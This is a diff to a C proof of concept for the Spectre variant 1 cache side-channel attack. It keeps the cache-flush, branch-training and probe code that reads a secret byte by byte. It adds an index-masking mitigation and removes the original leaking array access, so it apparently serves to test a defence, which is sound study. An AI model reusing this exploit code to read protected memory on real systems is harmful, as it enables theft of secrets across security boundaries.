@@ -17,7 +17,7 @@
 
 #define CACHE_HIT_THRESHOLD 80
 #define ARRAY1_SIZE 16
-#define TRIES 100
+#define TRIES 1000
 
 
 void exit(int status);
@@ -38,10 +38,22 @@ uint8_t array2[256 * 512];
 int results[256];
 uint8_t temp = 0; /* To not optimize out victim_function() */
 
+static inline unsigned long array_index_mask_nospec(unsigned long index,
+		unsigned long size)
+{
+	unsigned long mask;
+
+	__asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
+			:"=r" (mask)
+			:"g"(size),"r" (index)
+			:"cc");
+	return mask;
+}
+
 void victim_function(size_t x){
 	// TODO: check if it's possible to hardcode x
 	if(x < array1_size){
-		temp &= array2[array1[x] * 512];
+    x &= array_index_mask_nospec(x, array1_size);
 	}
 }
 
@@ -61,13 +73,13 @@ void probe_memory_byte(size_t offset, int * value, int * score){
 	unsigned int junk = 0;
   memset(results, 0, sizeof(results));
   
-  for(i=0; i<TRIES; i++){
+  for(tries=TRIES; tries>0; tries--){
 		// flush the whole array2 from cache
     for (j=0; j<256; j++){
       _mm_clflush(&array2[j*512]);
     }
 		// 5 training runs for each attack run
-		training_x = i % array1_size;
+		training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
       _mm_clflush( & array1_size); // flush the array1_size from cache to force a cache miss
 			_mm_mfence(); // delay to ensure that the clflush is finished
@@ -107,7 +119,6 @@ void probe_memory_byte(size_t offset, int * value, int * score){
   value[1] = (uint8_t) k;
   score[1] = results[k];
   results[0] ^= junk; /* use junk so code above won’t get optimized out*/
-	printf("value[0]: %d, score[0]: %d\n", value[0], score[0]);
 }	
 
 
@@ -121,9 +132,14 @@ int main(int argc,char** argv){
 
 	size_t offset = (secret_ptr - (uint8_t*)array1);
 
-	printf("secret_ptr: %p, size: %d\n, array1: %p ,offset %d\n", secret_ptr, size, array1, offset);
+	printf("secret_ptr: %p, size: %d, array1: %p ,offset %d\n", secret_ptr, size, array1, offset);
 
-	probe_memory_byte(offset,value,score);
-	printf("value[0]: %d, score[0]: %d\n", value[0], score[0]);
+
+  while (--size){
+    probe_memory_byte(offset++,value,score);
+    printf("value: %c(%d), score: %d\n", 
+        (value[0]>31 && value[0]<127) ? value[0] : '?', value[0], score[0]);
+  }
+  
   
 }
